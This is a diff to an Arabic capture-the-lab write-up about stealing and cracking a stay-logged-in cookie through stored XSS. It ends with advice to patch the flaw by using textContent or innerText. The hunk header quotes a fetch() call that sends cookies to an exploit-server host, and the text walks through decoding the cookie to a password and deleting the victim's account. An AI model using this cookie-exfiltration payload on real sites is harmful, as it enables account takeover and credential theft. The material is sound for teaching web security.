@@ -43,7 +43,7 @@ fetch('https://exploit-0a6400de04fd407e80a1112c01d2008b.exploit-server.net/?cook
 
 وسنلاحظ وجود كود `stay-logged-in` الخاص بحساب `carlos` وهو `Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz` وبإعادة تكرار نفس الخطوات التي فعلناها مع كود حساب `wiener` سنعرف أن المكتوب هو `carlos:onceuponatime` فنقوم بتسجيل الخروج، ومن ثم الدخول لحساب `carlos` والضغط على `Delete account` وستظهر صفحة أخرى تطلب إدخال كلمة المرور لتأكيد الحذف فنقوم بكتابتها مرة أخرى `onceuponatime` ونضغط على `Delete account!` لننتهي من حل اللاب.
 ## **`ترقيع الثغرة`**
-**`بالإضافة إلى جزء من ترقيع لاب` [Brute-forcing a stay-logged-in cookie](./Brute-forcing-a-stay-logged-in-cookie.md)
+**`بالإضافة إلى جزء من ترقيع لاب`** [Brute-forcing a stay-logged-in cookie](./Brute-forcing-a-stay-logged-in-cookie.md)
 
 فبما أن الهدف هنا هو مجرد عرض محتوى التعليق `Comment` للمستخدمين في واجهة المستخدم `Frontend`، فيجب على المبرمجين الاعتماد على خصائص آمنة مثل `textContent` أو `innerText` والتي تتعامل مع المدخلات كنص عادي `Plain Text` فقط، وتمنع تفعيل أي وسم `Tag` خبيث يتم حقنه مثل `<script>` أو `<img>`.
 
